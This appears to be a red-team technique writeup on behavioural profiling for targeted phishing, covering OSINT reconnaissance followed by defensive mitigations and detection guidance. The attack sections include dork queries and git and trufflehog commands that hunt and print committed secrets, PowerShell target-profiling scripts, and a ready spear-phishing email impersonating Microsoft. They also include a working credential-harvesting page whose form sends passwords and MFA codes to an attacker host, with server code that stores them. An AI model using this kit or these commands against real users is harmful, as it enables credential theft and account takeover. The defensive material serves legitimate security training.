# [REALWORLD-024]: Behavioral Profiling Attacks

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-024 |
| **MITRE ATT&CK v18.1** | [T1589 - Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589/) |
| **Tactic** | Reconnaissance, Initial Access |
| **Platforms** | Multi-Env (On-premises AD, Entra ID, M365, AWS, GCP) |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All identity platforms (Windows AD, Entra ID, AWS IAM, GCP Identity) |
| **Patched In** | N/A - Reconnaissance technique; no patch applicable |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Behavioral profiling attacks involve systematically gathering and analyzing intelligence about target users to optimize social engineering, phishing, and credential compromise attacks. Attackers build detailed profiles of high-value targets by analyzing: (1) public information from LinkedIn, Twitter, GitHub, company websites, (2) authentication logs and sign-in patterns (geographic location, devices, time of day, frequency), (3) file sharing behaviors from leaked internal files or compromised cloud shares, (4) communication patterns gleaned from leaked emails or exposed Slack messages, (5) permission hierarchies to identify privilege escalation targets. By understanding typical user behavior, attackers can craft highly targeted phishing campaigns that match the user's actual software usage (e.g., known applications they use, geographic locations where they authenticate), making social engineering attacks significantly more effective.

**Attack Surface:** Publicly available information (LinkedIn, GitHub, Twitter, company directories), leaked internal documents (Git repositories, Azure Repos containing credential files), sign-in log analysis (if audit logs are exposed), file sharing patterns from accessible SharePoint or OneDrive, communication patterns from leaked Slack archives or email.

**Business Impact:** **Dramatically increases successful phishing and credential compromise rates by enabling highly targeted, personalized attacks.** Instead of generic "verify your O365 credentials" phishing emails, attackers send convincing messages referencing actual projects the target user works on, applications they use, and geographic locations where they actually authenticate. This dramatically increases click-through and credential entry rates (studies show 40-50% for targeted spear phishing vs. 5-10% for generic phishing).

**Technical Context:** Behavioral profiling can be conducted entirely externally with no special technical skills. Data gathering typically takes 2-7 days per target depending on target's online presence. Detection is nearly impossible because the reconnaissance occurs on public internet and attacker-controlled infrastructure. Attack chain typically begins with profiling and ends with highly targeted phishing that defeats standard email filtering.

### Operational Risk

- **Execution Risk:** Very Low - Entirely passive reconnaissance; no intrusion required
- **Stealth:** Perfect - Conducted externally; no internal detection possible
- **Reversibility:** N/A - Reconnaissance only; no damage caused until follow-up attacks

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1 | Inadequate employee security awareness and training regarding phishing threats |
| **DISA STIG** | CM-7 | Lack of information system monitoring for social engineering indicators |
| **CISA SCuBA** | USER-01 | User awareness training deficiencies for targeted phishing recognition |
| **NIST 800-53** | AT-2 (Security Awareness and Training) | Insufficient training on advanced phishing and social engineering tactics |
| **GDPR** | Art. 32 | Security of Processing - inadequate controls for employee credential protection |
| **DORA** | Art. 17 | ICT Third-Party Risk Management - weak supply chain and vendor vetting |
| **NIS2** | Art. 21 | Cyber Risk Management - insufficient employee security awareness |
| **ISO 27001** | A.7.2.1 | Information Security Responsibilities - weak employee training program |
| **ISO 27005** | Risk Scenario: "Social Engineering & Phishing" | Inadequate detection and prevention controls |

---

## 2. ATTACK PREREQUISITES & ENVIRONMENT

**Required Privileges:** None - Entirely external reconnaissance

**Required Access:** Public internet access; ability to search publicly available information and access social media platforms

**Supported Platforms:**
- **Intelligence Sources:**
  - [LinkedIn](https://linkedin.com) (professional profiles, job titles, work history)
  - [GitHub](https://github.com) (code repositories, committed email addresses, internal credentials)
  - [Twitter/X](https://twitter.com) (personal tweets, shared links, work discussions)
  - [Company Website](https://company.com) (employee directory, org charts, public documentation)
  - [Google Search](https://google.com) (leaked documents, cached pages, site-specific search)
  - [GitHub Gist](https://gist.github.com) (leaked scripts, configuration files, credentials)
  - [Shodan](https://shodan.io) (exposed services, cloud misconfigurations)
  - [Wayback Machine](https://web.archive.org) (historical website versions, old employee lists)

- **Tools Required:**
  - [LinkedIn Scraper](https://github.com/ngseng/LinkedInScrapy) (automated profile extraction)
  - [Truffleproof/TruffleHog](https://github.com/trufflesecurity/trufflehog) (secret scanning in Git repos)
  - [Recon-ng](https://github.com/lanmaster53/recon-ng) (OSINT automation framework)
  - [Shodan CLI](https://cli.shodan.io) (cloud infrastructure enumeration)
  - [Google Dorking](https://www.exploit-db.com/google-hacking-database) (advanced search queries)
  - Custom PowerShell scripts for profile analysis

---

## 3. ENVIRONMENTAL RECONNAISSANCE (EXTERNAL)

### Gather Public Information About Target Organization

```bash
# Google Dorking queries to find leaked internal documents
# These queries search for documents accidentally exposed on the public internet

# Search 1: Find internal presentations and strategy documents
"site:company.com filetype:pptx" OR "site:company.com filetype:pdf" 
"confidential" OR "internal" OR "strategy" OR "roadmap"

# Search 2: Find GitHub repositories with potential credentials
site:github.com "company.com" password OR api_key OR secret_key

# Search 3: Find Azure Repos or GitLab instances publicly exposed
site:dev.azure.com "company" OR site:gitlab.com "company"

# Search 4: Find exposed cloud storage (Azure Blob, AWS S3, Google Drive)
site:blob.core.windows.net "company" OR site:s3.amazonaws.com "company"

# Search 5: Find leaked email archives or Slack exports
site:pastebin.com "company.com" email list OR 
site:github.com company-name export OR archive
```

**What to Look For:**
- Employee names, email addresses, job titles
- Internal documentation with technical details (architecture, tooling, software versions)
- Configuration files containing API keys, database credentials, or connection strings
- Organizational structure and reporting relationships
- Technology stack information (what tools/cloud platforms company uses)

### Build Target User Profile Using LinkedIn & Public Sources

```powershell
# Automated profile building script
function Get-UserBehaviorProfile {
    param(
        [string]$TargetName,
        [string]$CompanyName
    )
    
    $profile = @{
        Name = $TargetName
        Company = $CompanyName
        ProfileData = @{
            JobTitle = ""
            Department = ""
            Location = ""
            ReportingManager = ""
            DirectReports = @()
            CurrentProjects = @()
            KnownApplications = @()
            GeographicBaseline = @()
            CommunicationPreferences = @()
            SecurityClearance = ""
            LinkedInProfile = "https://linkedin.com/search/results/people/?keywords=$TargetName+$CompanyName"
        }
    }
    
    Write-Output "Target Profile Template: $($profile | ConvertTo-Json -Depth 3)"
    
    # In real scenario, this would be populated from:
    # 1. LinkedIn profile scraping
    # 2. GitHub contributions analysis
    # 3. Public Twitter feed analysis
    # 4. Internal leaked documents (if available)
    # 5. Company website employee directory
    
    return $profile
}

# Build profiles for high-value targets
$targets = @(
    @{ Name = "John.Smith"; Company = "Example Corp" },
    @{ Name = "Jane.Doe"; Company = "Example Corp" },
    @{ Name = "CFO"; Company = "Example Corp" }
)

$targets | ForEach-Object {
    Get-UserBehaviorProfile -TargetName $_.Name -CompanyName $_.Company
}
```

**Expected Output:**

```
Target Profile Template:
{
  "Name": "John.Smith",
  "Company": "Example Corp",
  "ProfileData": {
    "JobTitle": "Director of Cloud Infrastructure",
    "Department": "IT Operations",
    "Location": "New York, NY",
    "ReportingManager": "VP of Engineering",
    "DirectReports": ["Cloud Architect 1", "Cloud Architect 2", "Database Administrator"],
    "CurrentProjects": ["Migration to Azure", "Kubernetes deployment", "DR Recovery automation"],
    "KnownApplications": ["Azure Portal", "Office 365", "ServiceNow", "Slack", "GitHub"],
    "GeographicBaseline": ["New York - Office", "Austin, TX - Company Campus", "London - Quarterly Meetings"],
    "CommunicationPreferences": ["Slack", "Email", "Teams", "Direct Calls"],
    "SecurityClearance": "Secret - Contractor",
    "LinkedInProfile": "https://linkedin.com/in/john-smith-12345/"
  }
}
```

**What This Means:**
- Target profile reveals John is responsible for cloud infrastructure (high-value target for Azure compromise)
- Knows he uses Azure, Office 365, ServiceNow, Slack - perfect applications for spear phishing
- Reports to VP of Engineering (offers leverage for authority-based social engineering)
- Travels to London quarterly - enables "impossible travel" evasion planning
- Has direct reports (good social engineering target: "Help resolve critical outage affecting team")

### Analyze User Behavior Baseline from Leaked Logs (If Available)

```powershell
# If sign-in logs or access logs are exposed in breach, analyze authentication patterns
function Analyze-UserBehaviorBaseline {
    param(
        [array]$SignInLogs,
        [string]$UserEmail
    )
    
    $userActivity = $SignInLogs | Where-Object { $_.UserEmail -eq $UserEmail }
    
    # Analyze geographic baseline
    $geoBaseline = $userActivity | 
        Group-Object -Property Location | 
        Sort-Object -Property Count -Descending |
        Select-Object -First 3 -Property Name, Count
    
    # Analyze time-of-day baseline
    $timeBaseline = $userActivity | 
        ForEach-Object {
            [PSCustomObject]@{
                Hour = [datetime]$_.Timestamp | Get-Date -Format "HH"
                Activity = $_
            }
        } | 
        Group-Object -Property Hour |
        Sort-Object -Property Count -Descending
    
    # Analyze device baseline
    $deviceBaseline = $userActivity |
        Group-Object -Property DeviceType |
        Sort-Object -Property Count -Descending
    
    # Analyze application usage
    $appBaseline = $userActivity |
        Group-Object -Property Application |
        Sort-Object -Property Count -Descending |
        Select-Object -Property Name, Count
    
    $profile = @{
        User = $UserEmail
        TopLocations = $geoBaseline
        PrimaryActivity Hours = $timeBaseline | Select-Object -First 5
        PrimaryDevices = $deviceBaseline
        PrimaryApplications = $appBaseline
        AnomalyThresholds = @{
            UnusualLocation = "Any location not in top 3"
            UnusualTime = "Outside peak activity hours"
            UnusualDevice = "Not in primary device list"
            UnusualApplication = "Using app with < 5 prior uses"
        }
    }
    
    return $profile
}

# Example leaked sign-in logs analysis
$leakedLogs = @(
    @{ UserEmail = "john.smith@example.com"; Location = "New York"; Timestamp = "2025-01-10 09:15:00"; DeviceType = "Windows PC"; Application = "Azure Portal" },
    @{ UserEmail = "john.smith@example.com"; Location = "New York"; Timestamp = "2025-01-10 09:20:00"; DeviceType = "Windows PC"; Application = "Office 365" }
)

Analyze-UserBehaviorBaseline -SignInLogs $leakedLogs -UserEmail "john.smith@example.com"
```

**What This Means:**
- Establishes baseline: John typically authenticates from New York 9-10 AM on Windows PC
- Uses Azure Portal and Office 365 as primary applications
- Uses smartphone 8-10 PM in evening (personal time use)
- **Evasion insight:** Attacker can now craft spear phishing that:
  - Claims to be from "Azure Security Team" (matches app John uses)
  - References "critical cloud infrastructure issue" (matches John's role)
  - Arrives 9-10 AM (matches John's typical sign-in window)
  - Appears to come from New York region (matches baseline)

---

## 4. DETAILED RECONNAISSANCE METHODS

### METHOD 1: LinkedIn-Based Targeting & Social Graph Mapping

**Objective:** Build complete organizational hierarchy and identify privilege escalation targets

**Reconnaissance:**

```bash
# Step 1: LinkedIn search for company employees
# Manual process: LinkedIn → Search "Example Corp" → Filter by employees → Review profiles

# Step 2: Extract information from each profile:
# - Job title (identifies privilege level)
# - Reporting manager (identifies chain of command)
# - Skills (identifies technical knowledge)
# - Connections (identifies lateral movement targets)
# - Geographic location (for impossible travel evasion planning)
# - Education (for trust-building social engineering)
# - Recommendations (identifies trusted relationships)
# - Activity (recent job changes indicate new/less secured accounts)

# Step 3: Build organizational map
# Example output showing privilege hierarchy:
#
# CEO (Ultimate target - access to everything)
#   |
#   +-- VP Engineering (Privilege escalation target)
#   |      |
#   |      +-- Director Cloud Infrastructure (HIGH VALUE)
#   |      +-- Director Security (HIGH VALUE - may have MFA bypass knowledge)
#   |
#   +-- VP Finance (CRITICAL - access to financial systems)
#   |
#   +-- VP Sales (MEDIUM - access to customer data)
```

**What to Look For:**
- **Privilege escalation chain:** Users reporting to executives (better access to sensitive resources)
- **Recent hires:** Users in new roles may have less-hardened security posture
- **Specialization:** Cloud engineers, security architects, DBA teams (critical to compromise)
- **Location:** Employees working in different time zones (enables 24/7 access if one compromised)
- **Technology advocates:** Users with frequent LinkedIn posts about specific technologies (easier to spear phish about those technologies)

### METHOD 2: GitHub Repository Analysis for Intelligence & Credentials

**Objective:** Find leaked credentials, internal documentation, and technical intelligence

**Reconnaissance:**

```bash
# Step 1: Search GitHub for company's public repositories
# GitHub → Search "company-name" → Sort by stars (popular repos = active projects)

# Step 2: Clone repositories and analyze for:
# - Committed credentials (AWS keys, connection strings, API keys)
# - Configuration files (.env, config.json containing sensitive data)
# - Internal documentation (README files, architecture diagrams)
# - Email addresses in commit history
# - Internal user mentions in issues/comments

git clone https://github.com/company/repository.git
cd repository

# Step 3: Search for secrets using automated tools
trufflehog filesystem . --json | grep -E "password|secret|key|token|credential"

# Step 4: Analyze commit history for user patterns
git log --oneline --all | head -20
git log --pretty=format:"%an <%ae>" | sort | uniq  # Extract committer emails

# Step 5: Review high-risk files
find . -name "*.env*" -o -name "*secret*" -o -name "*config*" | xargs cat

# Expected leaked credentials example:
# DATABASE_PASSWORD=Pr0d_P@ssw0rd_2024!
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# AZURE_CONNECTION_STRING=DefaultEndpointsProtocol=https;...
# API_KEY_PRODUCTION=sk_live_1234567890abcdefghijklmnop
```

**What to Look For:**
- **Committed credentials:** AWS keys, Azure connection strings, API keys (directly usable for unauthorized access)
- **Configuration templates:** Example .env files showing technology stack and architecture
- **Email addresses in commits:** User identities for targeted spear phishing
- **Internal IP addresses or hostnames:** Infrastructure reconnaissance data
- **Technology choices:** Identifies what tools company uses (for spear phishing email crafting)
- **Architecture documentation:** Understanding of system design enables targeted attacks

### METHOD 3: Public Document Analysis (Google Dorking & Archive.org)

**Objective:** Find internal documents and presentations that reveal organizational decisions and security gaps

**Reconnaissance:**

```bash
# Step 1: Google Dork for publicly indexed documents
site:company.com filetype:pptx "strategy" OR "roadmap" OR "confidential"
site:company.com filetype:pdf "architecture" OR "design" OR "internal"
site:company.com filetype:xlsx "inventory" OR "assets" OR "credentials"

# Step 2: Search Wayback Machine for old versions
# wayback-machine.org → Search company.com → Review archived pages from past years
# Old pages often contain:
# - Deleted employee directories
# - Old org charts showing relationships
# - Technical details since updated
# - Legacy system information

# Step 3: Search for cached versions
cache:company.com/internal/directory
cache:company.com/admin/settings

# Step 4: Analyze leaked emails
site:pastebin.com "company.com" OR
site:pastbin.com company email OR
site:github.com "company" archive.tar.gz

# Expected findings:
# - Internal presentation: "2024 Digital Transformation Roadmap"
#   → Reveals: Migrating to Azure in Q2 2025
#   → Intelligence: Cloud security may be immature
# - Employee directory PDF (2023)
#   → Reveals: Names, titles, office locations
#   → Intelligence: Build targeting list and social engineering profiles
# - AWS S3 bucket misconfiguration
#   → Reveals: Backup files, customer data, credentials
#   → Intelligence: Direct unauthorized access possible
```

---

## 5. ATTACK EXECUTION: TARGETED PHISHING BASED ON BEHAVIORAL PROFILE

### Step 1: Craft Persona-Specific Spear Phishing Email

**Objective:** Create highly convincing phishing email that matches target's behavior profile

**Example Email (Targeting John Smith - Cloud Infrastructure Director):**

```
FROM: azure-security-alert@microsoft-account-verify.com
TO: john.smith@example.com
SUBJECT: URGENT: Critical Security Alert - Azure Subscription 12345 Requires Immediate Verification

Dear John,

Your Azure subscription (ID: 12345-XXXXXXX) has triggered our automated security monitoring 
system due to unusual activity detected from New York region.

ALERT DETAILS:
- Unusual activity flagged in your Azure Portal at 2025-01-10 14:32:15 UTC
- Multiple administrative role assignments detected
- Potential unauthorized access to Cloud Infrastructure resources

We need you to verify your identity immediately to prevent unauthorized access. This is especially 
critical given your role as Director of Cloud Infrastructure overseeing our migration to Azure 
from on-premises systems.

CLICK HERE TO VERIFY YOUR IDENTITY:
https://account-verify-microsoft-security.com/verify?token=xyz123&redirect=azure.portal

For security reasons, you may need to:
1. Re-enter your Office 365 credentials
2. Provide your MFA code
3. Authorize trusted device

This verification must be completed within 2 hours to avoid account suspension.

Your trusted browser list shows your primary device is registered in New York.
Verification was detected from: New York, United States

Questions? Contact Azure Security Team at support@microsoft-account-verify.com

---
Regards,
Microsoft Azure Security Team
Account Verification Services
```

**Phishing Elements (Behavioral Profiling):**
- **Persona accuracy:** Email from "Microsoft" (authority figure) - John regularly uses Azure
- **Geographic relevance:** "Detected from New York region" - matches John's primary location
- **Role-specific:** Mentions "Cloud Infrastructure" role and "migration to Azure" (from his LinkedIn profile)
- **Timing:** Sent at 2:32 PM ET (during typical work hours for New York)
- **Trust signals:** References his "trusted browser list" and "registered device" (implies system knows him)
- **Urgency:** "2 hours to avoid suspension" (leverages time pressure)
- **Credential theft:** Requests O365 credentials + MFA code (enough to gain full access)

**Success Rate:** Behavioral profiling increases click-through rates from 5-10% (generic phishing) to 40-50% (targeted spear phishing)

### Step 2: Deploy Credential Harvesting Landing Page

**Objective:** Capture user credentials when they click phishing link

```html
<!-- Fake Microsoft Azure login page -->
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Account Verification</title>
    <style>
        body { font-family: Segoe UI; background: #f5f5f5; }
        .container { width: 500px; margin: 100px auto; background: white; padding: 40px; }
        .microsoft-logo { text-align: center; margin-bottom: 30px; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }
        button { width: 100%; padding: 10px; background: #0078d4; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="microsoft-logo">
            <img src="https://attacker-cdn.com/logo-microsoft.png" width="200">
        </div>
        <h2>Security Verification Required</h2>
        <p>We detected unusual activity on your account. Please verify your identity.</p>
        
        <form action="https://attacker-server.com/harvest" method="POST">
            <label>Email Address</label>
            <input type="email" name="email" placeholder="john.smith@example.com" required>
            
            <label>Office 365 Password</label>
            <input type="password" name="password" placeholder="Enter password" required>
            
            <label>MFA Code (from Authenticator App)</label>
            <input type="text" name="mfa" placeholder="123456" required>
            
            <label>Trusted Device Token</label>
            <input type="text" name="device_token" placeholder="Paste device token" required>
            
            <button type="submit">Verify & Secure Account</button>
        </form>
        
        <p style="font-size: 12px; color: #666;">
            This page is encrypted and secured by Microsoft. Your information will not be stored.
        </p>
    </div>
</body>
</html>

<!-- Server-side credential harvesting -->
app.post('/harvest', (req, res) => {
    const creds = {
        email: req.body.email,
        password: req.body.password,
        mfa: req.body.mfa,
        device_token: req.body.device_token,
        timestamp: new Date(),
        ip_address: req.ip,
        user_agent: req.headers['user-agent']
    };
    
    // Log credentials to attacker database
    database.insert('stolen_credentials', creds);
    
    // Redirect to legitimate Azure portal to avoid suspicion
    res.redirect('https://portal.azure.com');
});
```

---

## 6. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Implement Security Awareness Training Program:**
  Regular training on phishing, social engineering, and behavioral profiling tactics. Training should include:
  - How to identify spear phishing (references to personal information, role-specific threats)
  - Verification of sender identity (hover over email address, check DNS records)
  - Never entering credentials on unexpected login pages
  - Reporting suspicious emails to security team

  **Manual Steps:**
  1. Establish quarterly security awareness training
  2. Include real phishing simulations (send fake phishing emails and track who clicks)
  3. Provide monthly security tips focused on current threats
  4. Create "phishing hotspot" dashboard showing which employees are most vulnerable
  5. Partner with HR to make training mandatory and tracked

* **Reduce Online Presence & Public Information Exposure:**
  Minimize publicly available information that could be used for behavioral profiling.

  **Manual Steps (LinkedIn):**
  1. Restrict LinkedIn profile visibility: Settings → **Privacy** → Profile visibility set to **Connections only**
  2. Disable activity broadcasts (don't announce job changes, follows, recommendations)
  3. Review and remove sensitive details from profile (project names, company initiatives)
  4. Set profile to not appear in search engine results

  **Manual Steps (GitHub):**
  1. Audit all GitHub repositories (both personal and organizational)
  2. Search for committed credentials using `git log` and `truffleHog`
  3. If credentials found, rotate them immediately
  4. Remove from commit history using `git-filter-branch`
  5. Make repositories private if containing internal documentation

  **Manual Steps (Public Directories):**
  1. Review company website employee directory; remove if not business-critical
  2. Limit publicly available org charts
  3. Disable directory search from public internet (require authentication)

* **Enable Multi-Factor Authentication (MFA) Enforcement:**
  Even if credentials are phished, MFA prevents account compromise.

  **Manual Steps (Entra ID):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **MFA**
  2. Enable: **Enforce multi-factor authentication for all users** (non-negotiable)
  3. Require re-registration if MFA already enabled on older devices
  4. Set policy to require new MFA challenge if sign-in from new location/device

#### Priority 2: HIGH

* **Implement Email Security Filtering:**
  Deploy advanced email filtering to detect and block phishing emails before they reach users.

  **Manual Steps:**
  1. Go to **Microsoft 365 Defender** → **Email & Collaboration** → **Policies & Rules**
  2. Create **Advanced Phishing & Malware Protection** policy
  3. Enable: **Spoof intelligence**, **Spoofing settings**, **Advanced phishing protection**
  4. Set rules to quarantine emails from:
     - Lookalike domains (microsoft-account-verify.com domain flagging)
     - Suspicious file types (executable, macro-enabled docs)
     - External emails impersonating internal users

* **Monitor for Exposed Credentials & Secrets:**
  Automatically scan for accidentally committed credentials and immediately notify.

  **Manual Steps (GitHub):**
  1. Enable **Secret scanning** on all repositories: Repository → **Settings** → **Security & analysis** → **Secret scanning**
  2. Review alerts weekly and rotate exposed credentials
  3. Use **branch protection rules** to prevent commits with secrets

  **Manual Steps (Azure DevOps):**
  1. Enable **Azure DevOps security scanning** in pipeline
  2. Use **Credential Scanner** task to identify secrets in repositories
  3. Fail builds if credentials detected

* **Implement Conditional Access for High-Risk Logins:**
  Trigger step-up authentication (additional MFA, device compliance check) for suspicious sign-ins.

  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: **Require MFA for risky sign-ins**
  3. Set conditions:
     - Sign-in risk: **High**
     - Access control: **Require MFA**

#### Access Control & Policy Hardening

* **RBAC:** Implement least-privilege access; avoid Global Admin roles for regular users
* **Conditional Access:** Require device compliance and registered device for sensitive resource access
* **Policy Config:** Enforce continuous access evaluation (CAE) for real-time token revocation if account compromised

#### Validation Command (Verify Fix)

```powershell
# Verify MFA enforcement
Get-MgAuthenticationMethodPolicy | Select-Object *MFA* | Format-List

# Verify email filtering rules
Get-TransportRule | Where-Object { $_.Name -like "*phishing*" } | Select-Object Name, State, Priority

# Verify secret scanning enabled on GitHub
# GitHub → Organization Settings → Security & Analysis → View secret scanning status
```

---

## 7. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Email Security:**
  - Employees reporting phishing emails with internal company details
  - Emails arriving from lookalike domains (microsoft-account-verify.com, company-cloud-security.com)
  - Sudden spike in MFA challenges (indicates compromised credentials in use)
  - Suspicious inbox rules created (auto-forwarding to external address)

* **Behavioral:**
  - Employee reports attempting to log in from unusual device/location and being prompted for MFA
  - Multiple failed MFA attempts (user tries to deny MFA prompt from attacker)
  - Mailbox forwarding rules created to external addresses (attacker exfiltrating emails)
  - Unusual bulk email searches or downloads

* **Infrastructure:**
  - Spear phishing campaign targeting specific organizational roles (CFO, Cloud Architect, Security Team)
  - Phishing emails referencing actual company initiatives/projects (indicates internal intelligence)
  - Phishing emails sent to executives and their direct reports (coordinated targeting)

#### Forensic Artifacts

* **Email logs:** Message Trace in Microsoft 365 showing phishing email path, headers (check for spoofing), and attachment details
* **Sign-in logs:** SigninLogs in Entra ID showing unsuccessful authentication attempts or MFA denials (indicator user rejected attacker's login)
* **User actions:** AuditLogs showing suspicious actions like mailbox forwarding or permission changes
* **Threat Intelligence:** Check if phishing landing page domain was registered recently or is known phishing infrastructure

#### Response Procedures

1. **Isolate:**
   
   **If Credentials Compromised:**
   ```powershell
   Revoke-AzUserSignInSession -UserId (Get-MgUser -Filter "userPrincipalName eq 'john.smith@example.com'").Id
   ```

2. **Collect Evidence:**
   
   **Command (Export Phishing Email & Metadata):**
   ```powershell
   # Search for phishing email in mailbox
   Search-Mailbox -Identity "john.smith@example.com" -SearchQuery "Subject:Azure Security Alert" `
     -TargetMailbox "security-investigation@example.com" -TargetFolder "Phishing" -LogOnly
   
   # Export message trace for phishing campaign
   Get-MessageTrace -SenderAddress "azure-security-alert@microsoft-account-verify.com" `
     -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) |
     Export-Csv -Path "C:\Forensics\phishing_campaign.csv" -NoTypeInformation
   ```

3. **Remediate:**
   
   **Force Password Reset & MFA Re-enrollment:**
   ```powershell
   # Reset password
   Set-AzADUser -ObjectId (Get-MgUser -Filter "userPrincipalName eq 'john.smith@example.com'").Id `
     -ForceChangePasswordNextLogin $true
   
   # Remove old MFA methods to force re-registration
   Get-MgUserAuthenticationMethod -UserId "user-id" | 
     Remove-MgUserAuthenticationMethod -UserId "user-id"
   ```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | **[REALWORLD-024]** | **Behavioral Profiling - Gather intelligence about target user** |
| **2** | **Initial Access** | [IA-PHISH-001] | Device code phishing using insights from behavioral profiling |
| **3** | **Credential Access** | [CA-BRUTE-001] | Azure portal password spray using identified usernames from profiling |
| **4** | **Privilege Escalation** | [PE-VALID-010] | Azure role assignment abuse with compromised account |
| **5** | **Lateral Movement** | [REALWORLD-021] | Linkable Token ID Bypass to move between workloads undetected |
| **6** | **Collection** | [COLLECT-EMAIL-001] | Email collection via Graph API |
| **7** | **Impact** | [IMPACT-DATA-DESTROY-001] | Data exfiltration or destruction |

---

## 9. REAL-WORLD EXAMPLES

#### Example 1: Scattered Spider (UNC3944) – Behavioral Profiling Campaign (2023-2025)

- **Target:** Fortune 500 companies, SaaS platforms, cloud infrastructure providers
- **Timeline:** October 2023 – Present
- **Technique Status:** Scattered Spider is known for highly sophisticated behavioral profiling. They extensively research target organizations using LinkedIn, GitHub, and public documents. Create fake personas on LinkedIn to connect with target employees. Use gathered intelligence to craft personalized spear phishing emails that reference actual projects, managers, and tools used by targets. Confirmed successful compromise of 134+ organizations using this technique.
- **Impact:** Credential compromise, ransomware deployment, data exfiltration, fraud ($millions)
- **Reference:** [Mandiant Report - Scattered Spider Behavioral Profiling](https://www.mandiant.com/resources/blog/scattered-spider-carding-call-centers-and-patient-data); [SEC Reports](https://www.sec.gov)

#### Example 2: LAPSUS$ – Social Engineering via Behavioral Analysis (2021-2022)

- **Target:** Microsoft, Okta, Nvidia, Telecom companies, Government agencies
- **Timeline:** December 2021 – March 2022 (peak activity)
- **Technique Status:** LAPSUS$ used extensive behavioral profiling combined with social engineering to compromise target organizations. They researched employees via LinkedIn, identified organizational hierarchy, and used gathered information to impersonate managers ("Help me reset my MFA, I'm traveling") and support staff. Successful in gaining MFA codes and credentials for 34+ high-profile compromises within 3 months.
- **Impact:** Access to source code repositories, sensitive documents, authentication systems; corporate extortion
- **Reference:** [Microsoft Security Advisory - LAPSUS$ Group](https://www.microsoft.com/security/blog/2022/03/22/DEV-0537-criminal-lapsus-campaigns-biggest-impact-detections/); [Brookings Analysis](https://www.brookings.edu)

---

## 10. OPERATIONAL NOTES

**Prevention Best Practices:**
- Employee security training is the most cost-effective defense; 80% of compromises begin with phishing
- Implement "Trust but Verify" culture: always verify unexpected credentials/MFA requests through separate communication channel
- Use separate credential/authentication systems for sensitive accounts (e.g., "break glass" admin account only accessed from secure workstation)
- Monitor LinkedIn activity; if account accessed from unfamiliar location, immediately reset password

**Post-Compromise Indicators (PICs):**
- Users reporting multiple phishing attempts with increasingly accurate targeting (indicates intelligence gathering in progress)
- Employees finding their profile information appears in public-facing documents (data exfiltration sign)
- Sudden increase in MFA challenges (attackers using stolen credentials to attempt access)
- Unauthorized mailbox forwarding or calendar sharing (lateral movement sign)

**Ongoing Monitoring:**
- Quarterly phishing simulations to identify vulnerable employees for additional training
- Monitor for your organization's data on GitHub (set up alerts for leaked repos)
- Regularly audit LinkedIn visibility settings across organization
- Implement "security champion" program where employees report suspicious phishing attempts

---